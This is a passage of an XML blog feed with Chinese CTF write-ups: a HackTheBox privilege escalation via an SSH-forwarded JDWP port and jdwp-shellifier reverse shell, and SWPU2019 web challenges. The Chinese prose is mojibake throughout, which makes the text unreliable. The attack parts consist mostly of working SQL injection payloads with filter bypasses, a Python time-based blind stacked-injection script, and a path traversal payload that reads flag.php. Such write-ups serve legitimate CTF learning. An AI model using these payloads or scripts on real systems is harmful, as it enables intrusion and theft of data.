ï¼Œååˆ†éº»çƒ¦ã€‚è€Œä¸”å°†è¦åˆ©ç”¨çš„jdwpæ˜¯javaçš„debugåŠŸèƒ½ï¼Œæ®è¯´æ“ä½œæ—¶ååˆ†å®¹æ˜“æ–­å¼€ã€‚é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥æœ¬æœºå¤„ç†è¿™ä¸ªjdwpå‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ç«¯å£è½¬å‘ã€‚åŸæœ¬è‡ªå·±ä»¥ä¸ºååˆ†å¤æ‚ï¼Œä½†å®é™…ä¸Šå¹¶éå¦‚æ­¤ã€‚</p><p>é¦–å…ˆåœ¨é¶æœºä¸Šç¡®è®¤jdwpæ˜¯è¿è¡Œåœ¨8000ç«¯å£çš„ã€‚<br>é‚£ä¹ˆæˆ‘å…ˆè¿›å…¥tomcatçš„ç›®å½•ï¼ŒæŒ‰ä¸‹<code>~C</code>å°†ç›´æ¥è¿›å…¥sshï¼Œç„¶åå°†å…¶è½¬åˆ°localhostæ¥ç ”ç©¶</p><pre><code>-L 8000:localhost:8000</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a13.PNG" class="lazyload" data-srcset="a13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="8000ç«¯å£"></p><p>è¿™æ—¶æˆ‘ä»¬åœ¨æœ¬æœºä¸Šä½¿ç”¨</p><pre><code>ss -lntp</code></pre><p>æŸ¥çœ‹ä¸»æœºç›‘å¬çš„ç«¯å£ã€‚å°±ä¼šå‘ç°8000ç«¯å£å¤„äºç›‘å¬çŠ¶æ€äº†ï¼Œuseræ˜¯sshã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•è½¬å‘tomcatçš„8009å’Œ8080ç«¯å£åˆ°æœ¬åœ°ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ç›´æ¥æµè§ˆå™¨è®¿é—®<code>localhost:8080</code>æ¥åˆ†ætomcatï¼ˆå½“ç„¶è¿™é‡Œæ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼‰</p><p>å½“ç„¶ï¼Œè¿™é‡Œè½¬å‘åˆ°æœ¬åœ°æœ¬æ¥åªæ˜¯æ–¹ä¾¿è°ƒè¯•ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥åœ¨æœ¬åœ°æ‰‹åŠ¨åˆ©ç”¨jdwpçš„æ¼æ´ï¼Œæ‰¾åˆ°ä¸€ä¸ªbreakpointç”¨debugåŠŸèƒ½æ¥æ‰§è¡Œå‘½ä»¤ã€‚ä½†æ˜¯è¿™æ–¹é¢å®åœ¨ä¸ç†Ÿï¼ˆjavaç™½å­¦äº†ï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›´æ¥åˆ©ç”¨ä¸Šé¢çš„è„šæœ¬èˆ’æœå•Šã€‚<br>shellifierç”¨æ³•</p><pre><code>python jdwp-shellifier.py -t ç›®æ ‡ä¸»æœºip -p jdwpè¿è¡Œç«¯å£ --cmd &quot;Your Command&quot;</code></pre><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥</p><pre><code>python jdwp-shellifier.py -t 127.0.0.1 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;/tmp/test.sh&quot;</code></pre><p>å› ä¸ºè½¬å‘äº†ipï¼Œç«¯å£æ‰€ä»¥ä½¿ç”¨çš„ipæ˜¯æœ¬åœ°ã€‚è€Œbreak-onè¿™ç‚¹æ–¹ä¾¿æ‰¾å‡ºå¯ä»¥åˆ©ç”¨çš„æ–­ç‚¹ã€‚æœ€åçš„cmdæ‰§è¡Œæˆ‘ä»¬çš„åå¼¹shellã€‚<br>æœ¬æœºå†åº¦ç›‘å¬åæ‰§è¡Œè¿™ä¸ªè„šæœ¬<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a14.PNG" class="lazyload" data-srcset="a14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="root"><br>æˆåŠŸåå¼¹shellåˆ°æœ¬æœºã€‚å³å¯æ‹¿åˆ°root.txt</p><p>æ„Ÿè§‰ææƒè¿™æ–¹é¢è‡ªå·±è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œå¯èƒ½å› ä¸ºå¤§éƒ¨åˆ†ctfæ¯”èµ›æ³¨é‡çš„ä¹Ÿåªæ˜¯getshellå±‚é¢ä¸Šçš„å§ï¼Œä¹‹åçš„æ“ä½œè¿˜è¦å¤šåŠ äº†è§£çŸ¥è¯†å­¦ä¹ å•Šã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»SWPU2019-WEB1&amp;WEB4å­¦sqlæ³¨å…¥</title>
      <link href="2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/"/>
      <url>2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æ‰“ç®—è¿™å‡ å¤©é‡æ–°ä»å¤´å¼€å§‹å­¦ä¸‹sqlæ³¨å…¥çš„ï¼Œæ¯•ç«Ÿhgameweek1çš„wpéƒ½å·²ç»å†™å¥½äº†ï¼Œé¢˜èƒ½åšçš„éƒ½åšäº†ã€‚ä½†æ˜¯çŒ›ç„¶æƒ³èµ·ä»Šå¹´åœ¨æ··äº†ä¸‹GXYCTFå‰è¿˜å®æ‰“å®çš„æ‰“äº†GWCTFè·ŸSWPUCTFã€‚å½“æ—¶GWçš„é¢˜åšäº†ä¸¤é“webï¼Œä¸€é“phpéšæœºæ•°æ¼æ´ä¸€é“phpmyadmin getshellï¼Œæ²¡ä»€ä¹ˆå«é‡‘é‡å°±æ²¡å†™ã€‚è€Œä¸”äº‹åçœ‹å…¶ä»–é€‰æ‰‹å°±åªæœ‰ä¸€ä¸ªäººwebåšäº†ä¸‰é“ï¼Œå…¶ä½™åŸºæœ¬éƒ½æ˜¯1,2é“å°±è§‰å¾—æ²¡ä»€ä¹ˆå¤ç°å…¶ä»–é¢˜çš„å¿…è¦ï¼›swpuå°±å®Œå…¨ç›¸åäº†ï¼Œwebé¢˜éš¾åº¦å¯¹æˆ‘è€Œè¨€æœ‰äº›é«˜äº†ï¼Œè€Œä¸”è¿˜æœ‰å‘åœ¨é‡Œé¢ã€‚å½“æ—¶å°±åšäº†ä¸‰é“éšå†™é¢˜ï¼ˆè®°å¾—æ¯é“éšå†™éƒ½æ˜¯zipå‹é¢˜ç›®ï¼‰ï¼Œä¹‹åæ²¡æ¡ä»¶åä¹Ÿæ²¡æ—¶é—´å¤ç°ã€‚æ‰€ä»¥åœ¨æ­¤å†æ¬¡æ„Ÿè°¢buuojç»™äº†æˆ‘å¤ç°é¢˜ç›®çš„æœºä¼šâ€¦â€¦</p><a id="more"></a><p>æœ‰ä¸€è¯´ä¸€ï¼Œswpué¢˜ç›®éš¾å½’éš¾ï¼Œå®˜æ–¹wpè¿˜æ˜¯å¾ˆè¯¦ç»†çš„ã€‚</p><h1 id="web1-sqlæ³¨å…¥ï¼ˆunion-or-äºŒæ¬¡æ³¨å…¥-ï¼‰"><a href="#web1-sqlæ³¨å…¥ï¼ˆunion-or-äºŒæ¬¡æ³¨å…¥-ï¼‰" class="headerlink" title="web1(sqlæ³¨å…¥ï¼ˆunion or äºŒæ¬¡æ³¨å…¥ ï¼‰)"></a>web1(sqlæ³¨å…¥ï¼ˆunion or äºŒæ¬¡æ³¨å…¥ ï¼‰)</h1><p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="sqlæ³¨å…¥"></p><p>è¿™é“é¢˜ç›®çš„ç‚¹åœ¨äºsqlæ³¨å…¥ã€‚å¼€å§‹çš„ç™»é™†æ¡†çŸ¥è¯†å¹Œå­ï¼Œæ³¨å†Œè´¦å·ç™»é™†è¿›å»åå°±ä¼šå‘ç°æœ‰ä¸€ä¸ªå¹¿å‘Šç”³è¯·çš„è¿™ä¸€æ“ä½œã€‚é€šå¸¸çœ‹åˆ°è¿™ç§å½¢å¼ï¼ŒåŸºæœ¬ç¡®å®šæ˜¯sqlæ³¨å…¥æˆ–è€…æ˜¯xssã€‚FUZZä¸€ä¸‹åï¼Œå¯ä»¥ç¡®è®¤æ˜¯sqlã€‚<br>å°è¯•ç®€å•çš„æ³¨å…¥è¯­å¥ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨<code>/**/</code>ç»•è¿‡æˆåŠŸã€‚<br>å½“æ—¶è¿˜FUZZå‡ºæ¥äº†æŠ¥é”™æ³¨å…¥çš„å…³é”®å‡½æ•°ï¼Œä»¥åŠå¸¸è§çš„æ³¨é‡Šç¬¦å·ï¼Œå…³é”®å­—orä¹Ÿè¢«è¿‡æ»¤äº†ã€‚<br>å› æ­¤ï¼ŒæŒ‰ç…§è‡ªå·±çš„ç¬¬ä¸€æƒ³æ³•ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨æœ€æ™®éçš„unionè”åˆæŸ¥è¯¢ï¼Œåªæ˜¯è¿™æ ·ä¼šé¢ä¸´å‡ ä¸ªé—®é¢˜ï¼š</p><p>1.æ³¨é‡Šè¢«è¿‡æ»¤å¸¦æ¥çš„é—­åˆé—®é¢˜<br>2.é¢å¯¹å¼ºè¿‡æ»¤çš„or,åé¢è¿›è¡Œæ³¨å…¥çˆ†å‡ºè¡¨ååŠåˆ—åçš„å¸¸è§„è¯­å¥ï¼š<code>union select group_concat(table_name) from information_schema.tables where table_schema=database()</code>å°†å­˜åœ¨informationä¸­çš„orè¢«è¿‡æ»¤çš„å¢ƒåœ°</p><p>äº‹å®ä¸Šï¼Œå¯¹äºç¬¬ä¸€ç‚¹çš„é—­åˆé—®é¢˜ï¼Œè‡ªå·±åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ç›¸å…³bypassæŠ€å·§ã€‚ç¡®åˆ‡è¯´ä¸ç®—æŠ€å·§ï¼Œåº”è¯¥æ˜¯åœ¨sqlæ³¨å…¥ä¸­å¯¹åº”å½“å…ˆåšçš„ç¬¬ä¸€æ­¥â€˜å¤åŸsqlæŸ¥è¯¢è¯­å¥â€™åæ‰€è¿›è¡Œçš„å¸¸è§„åˆ¤æ–­ã€‚<br>ç”±äºFUZZï¼Œæ—¶ï¼Œæˆ‘ä»¬åœ¨è¾“å…¥<code>-1&#39;</code>æ—¶å¾—åˆ°æŠ¥é”™ç»“æœï¼Œé‚£å¤åŸå‡ºæ¥çš„è¯­å¥åº”è¯¥æ˜¯ï¼š</p><pre><code>select * from ads where title = &#39;$title&#39; limit 0,1;</code></pre><p>å› æ­¤é¢å¯¹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä¸ä½¿ç”¨è¿‡æ»¤å·ï¼Œä½¿ç”¨<code>&#39;</code>ï¼ˆå•å¼•å·ï¼‰é—­åˆå•å¼•å·æ˜¯æ°´åˆ°æ¸ æˆçš„ã€‚<br>é‚£ä¹ˆç°åœ¨å°±è¦å¼€å§‹fuzzå­—æ®µæ•°äº†â€¦â€¦é¦–å…ˆï¼Œå‘ç°<code>order by</code>çš„orä¹Ÿè¢«è¿‡æ»¤äº†,è½¬è€Œä½¿ç”¨<code>group by</code>ã€‚å¥½çš„ï¼Œè¿™é“é¢˜å½“æ—¶æœ€ä¸ºäººè¯Ÿç—…çš„åœ°æ–¹æ¥äº†ï¼Œé‚£å°±æ˜¯å®ƒå±…ç„¶æœ‰22ä¸ªå­—æ®µæ•°ï¼æˆ‘æƒ³äººæ‰‹å·¥ä½¿ç”¨è¯­å¥fuzzå‘ç°è¿™ä¹ˆå¤šå­—æ®µæ•°åº”è¯¥æ˜¯æ—©å°±æ€€ç–‘äººç”Ÿäº†å§ï¼Ÿå½“æ—¶ä¼°è®¡å¾ˆå¤šäººéƒ½å€’åœ¨è¿™é¢˜çš„å­—æ®µæ•°ä¸Šã€‚<br>FUZZå­—æ®µï¼š</p><pre><code>-1&#39;/**/group/**/by/**/22,&#39;1</code></pre><p>æˆåŠŸåæ¥ä¸‹æ¥union selectå§</p><pre><code>-1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å­—æ®µ"><br>ç¡®è®¤äº†å›æ˜¾çš„æ˜¯2å’Œ3å¯¹åº”å­—æ®µã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å¦‚ä½•è§£å†³<code>information_schema</code>çš„é—®é¢˜å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»å®˜æ–¹wpä¸­å­¦åˆ°äº†bypass<code>information_schema</code>çš„æ–¹æ³•å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« <br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>ä»”ç»†æƒ³æƒ³ï¼Œinformation_schemaåœ¨æ³¨å…¥ä¸­ä¸å¯æˆ–ç¼ºçš„åŸå› æ— éæ˜¯å› ä¸ºå®ƒåŒ…å«äº†æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯table_schemaï¼Œtable_name.column_nameç­‰ç­‰ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„å­˜åœ¨å‘¢ï¼Ÿæ–‡ç« ä¸­æä¾›äº†ä¸€ç§è§£æ³•:<code>sys.schema_auto_increment_columns</code>è¯¥è§†å›¾çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å¯¹è¡¨è‡ªå¢IDçš„ç›‘æ§ã€‚å¦‚æœè¡¨ä¸­å­˜åœ¨è‡ªå¢id,é‚£ä¹ˆè¿™ä¸ªè§†å›¾å°±ä¼šåŒ…å«è¿™ä¸€ è¡¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„è§£æ³•æ˜¯</p><pre><code>-1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p>ç„¶åéš¾è¿‡äº†ï¼Œå›æ˜¾å±…ç„¶æ˜¯è¿™ä¸ªè¡¨ä¸å­˜åœ¨ï¼Ÿï¼ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿™é“é¢˜åœ¨buuojä¸Šå°‘äº†å•¥ï¼Œæ¯•ç«Ÿæˆ‘ç”¨çš„è·Ÿå®˜æ–¹wpæ˜¯ä¸€æ ·çš„â€¦â€¦é‚£å°±æ²¡åŠæ³•äº†ï¼Œåªèƒ½ç›²çŒœä¸€äº›å¸¸è§è¡¨åï¼Œæ¯”å¦‚userï¼Œpasswordä¹‹ç±»çš„ã€‚è¿™é‡Œå°±å¼€ä¸ªå¤©çœ¼è¡¨ç¤ºæ˜¯usersè¡¨å§ã€‚<br>æ¥ä¸‹æ¥ç”±äºä¸çŸ¥é“åˆ—åï¼Œå¼•å…¥ä¸€ä¸ªä»¥å‰è‡ªå·±ä¸æ€ä¹ˆç†Ÿæ‚‰çš„ç‚¹ï¼šæ— åˆ—åæ³¨å…¥ï¼Œè¿™é‡Œçœ‹åˆ°ä¸€ç¯‡æ–‡ç« è®²çš„å¾ˆå‡†ç¡®ï¼š<br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</a><br>è¿™é‡Œç›´æ¥å¼•ç”¨å®ƒçš„æ•°æ®äº†ï¼š<br>æ™®é€šçš„sqlæ³¨å…¥</p><pre><code>select * from users</code></pre><pre><code>+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+| id | name         | password                                 | email                       | birthdate  | added               |+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+|  1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 ||  2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 ||  3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 ||  4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 ||  5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+5 rows in set (0.00 sec)</code></pre><pre><code>select 1,2,3,4,5 ,6union select * from users</code></pre><pre><code>+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | 2            | 3                                        | 4                           | 5          | 6                   |+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | 2            | 3                                        | 4                           | 5          | 6                   || 1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 || 2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 || 3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 || 4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 || 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+6 rows in set (0.00 sec)</code></pre><p>è¿™æ—¶è‹¥è¦å¼•ç”¨ï¼Œä½¿ç”¨åå¼•å·ï¼š</p><pre><code> select `4` from (select 1,2,3,4,5,6 union select * from users)a;</code></pre><p>åˆ™ä¼šå•ç‹¬æ‹¿åˆ°ç¬¬å››åˆ—</p><pre><code>+-----------------------------+| 4                           |+-----------------------------+| 4                           || veronica80@example.org      || sawayn.amelie@example.com   || stefan41@example.com        || zwalsh@example.com          || pattie.medhurst@example.net |+-----------------------------+6 rows in set (0.00 sec)</code></pre><p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤äº†ï¼Œä¹Ÿæœ‰å…¶ä»–æ–¹æ³•ã€‚</p><pre><code>select b from (select 1,2,3 as b,4,5 union select * from users)a;</code></pre><pre><code>+-----------------------------+| b                           |+-----------------------------+| 4                           || veronica80@example.org      || sawayn.amelie@example.com   || stefan41@example.com        || zwalsh@example.com          || pattie.medhurst@example.net |+-----------------------------+6 rows in set (0.00 sec)</code></pre><p>å›åˆ°é¢˜ç›®ï¼Œä¸éš¾å¾—å‡ºæœ€ç»ˆpayload:</p><pre><code>-1&#39;union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </code></pre><pre><code>-1&#39;union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </code></pre><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>æ˜¨å¤©æ™šä¸Šå†™äº†å†™web1,æŠ˜è…¾çš„å¤Ÿå‘›ã€‚ä»Šå¤©åœ¨å¤ç°web4æ—¶ä¹ŸæŒºéš¾å—çš„ï¼Œæ‰€å¹¸æœ€åè¿˜æ˜¯åšå‡ºæ¥äº†ã€‚<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ç™»å½•æ¡†"><br>é¢˜ç›®æ‰€ç»™defæ³¨å†ŒåŠŸèƒ½å¹¶æ²¡æœ‰å¼€æ”¾ï¼Œè€Œç™»å½•é”®ç‚¹äº†ä¹Ÿæ²¡æœ‰ååº”ã€‚æŠ“åŒ…çš„è¯ä¼šæœ‰æ–°å‘ç°ï¼š<img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ³¨å…¥"><br>å¦‚æœåªæœ‰å•å¼•å·çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚ä½†æ˜¯å¦‚æœè¾“å…¥ç»“æœé™¤äº†å•å¼•å·è¿˜æœ‰åˆ†å·çš„è¯ï¼Œè¿”å›çš„ä»æ˜¯202ã€‚è¿™ä»£è¡¨äº†ä»€ä¹ˆå‘¢ï¼Ÿé¦–å…ˆå¯ä»¥ç¡®è®¤æ˜¯æ³¨å…¥ï¼ŒåŒæ—¶è¿˜å¯ä»¥å¤§è‡´åˆ¤æ–­æ˜¯å †å æ³¨å…¥ã€‚<br>å…³äºå †å æ³¨å…¥æˆ‘å¹¶æ²¡æœ‰ä»€ä¹ˆäº†è§£ã€‚äºæ˜¯å»æœç´¢äº†ä¸‹ï¼Œå‘ç°è¿™å‡ å¹´å¼€å§‹æœ‰å †å æ³¨å…¥çš„ctfé¢˜åœ¨å„å¤§èµ›äº‹ä¸­å‡ºç°ã€‚å…¶ç‰¹ç‚¹æ— éæ˜¯ï¼šé™åˆ¶äº†å¸¸ç”¨çš„select,updateç­‰ç­‰å…³é”®è¯­å¥ã€‚ä½†æ˜¯å´æ²¡æœ‰é™åˆ¶ä½ çš„åˆ†å·ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€æ¬¡æ‰§è¡Œå¤šæ¡sqlè¯­å¥ã€‚è€Œå¦‚æœé€‚å½“æ­é…ï¼Œä¸€æ ·å¯ä»¥èµ·åˆ°æ³¨å…¥çš„æ•ˆæœã€‚<br>æ ¹æ®å®˜æ–¹çš„è¯´æ³•ï¼Œè¿™æ˜¯å±äºPDOåœºæ™¯ä¸‹çš„sqlæ³¨å…¥ï¼Œå‡ºé¢˜äººç»™çš„æ–¹æ³•å°±æ˜¯ç”¨16è¿›åˆ¶åŠ mysqlé¢„å¤„ç†æ¥è§£å†³ã€‚å…¶payloadå¤§è‡´æ ¼å¼å¦‚ä¸‹ï¼š</p><pre><code>set @a=0x{0};PREPARE ctftest from @a;execute ctftest;</code></pre><p>å‰é¢çš„@aå³ä¸ºæˆ‘ä»¬æ‰€éœ€çš„æ³¨å…¥è¯­å¥çš„16è¿›åˆ¶å˜é‡ï¼Œåé¢<code>PREPARE ctftest from @a;execute ctftest;</code>ä¸¤å¥èµ·åˆ°äº†å®šä¹‰å¹¶æ‰§è¡Œé¢„å¤„ç†è¯­å¥çš„ä½œç”¨<br>é‚£ä¹ˆç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼š</p><pre><code class="python">import requestsurl=&quot;http://094a7801-436a-4a50-9b73-ea921af6361c.node3.buuoj.cn/index.php?r=Login/Login&quot;flag=&quot;&quot;def str_to_hex(s):    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])for i in range(1,40):    print(i)    for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;:        sql = &quot;select if((ascii(substr((select group_concat(flag) from flag),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(ord(str1))+&quot;&#39;),sleep(6),2);&quot;   # ctf        sql_hex = str_to_hex(sql)        data={            &quot;username&quot;:&quot;1\&#39;;SET @a=0x&quot;+str(sql_hex)+&quot;;PREPARE st FROM @a;EXECUTE st;&quot;,            &quot;password&quot;:&quot;123&quot;        }        try:            result=requests.post(url,json=data,timeout=6)        except requests.exceptions.ReadTimeout:            print(flag)            breakprint(flag)#glzjinwantsaliendzip#glzjinnts_a_girl_friendzip#glzjinwantsgirliendzip#glzjin_wants_a_girl_friend.zip</code></pre><p>è¿™é‡Œå¯èƒ½ç”±äºbuuojçš„é—®é¢˜å§ï¼Œè®¿é—®è¿‡å¿«ç›´æ¥429,å¯¼è‡´æ¯æ¬¡è·‘å‡ºçš„ç»“æœéƒ½ä¸ä¸€æ ·ã€‚æœ€åæ±‡æ€»ä¸‹æ‰æ¨æ–­å‡ºæ¥æ˜¯glzjin_wants_a_girl_friend.zipã€‚(è¿™é‡Œç›´æ¥select flag from flagäº†ï¼Œå®åœ¨ä¸æƒ³åˆå»çˆ†è¡¨çˆ†åˆ—äº†ã€‚ã€‚ï¼‰<br>æ‹¿åˆ°æºç ï¼Œå®¡è®¡ä¸æäº†ã€‚ç›´æ¥è¯´å‡ºé¢˜äººæ€è·¯å§ï¼š<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å®¡è®¡"><br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="åˆ©ç”¨"><br>å‘ç°ä¼šè¯»å–img_fileå†…å®¹å¹¶ä»¥base64è¾“å‡ºã€‚é‚£ä¹ˆåªè¦img_fileåŒ…å«flag.phpå°±å¥½äº†ã€‚<br>payload:</p><pre><code>?r=User/Index&amp;img_file=/../flag.php</code></pre><p>å³å¯ä»æºç å¤„è§£ç æ‹¿åˆ°flag<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/7.jpg" 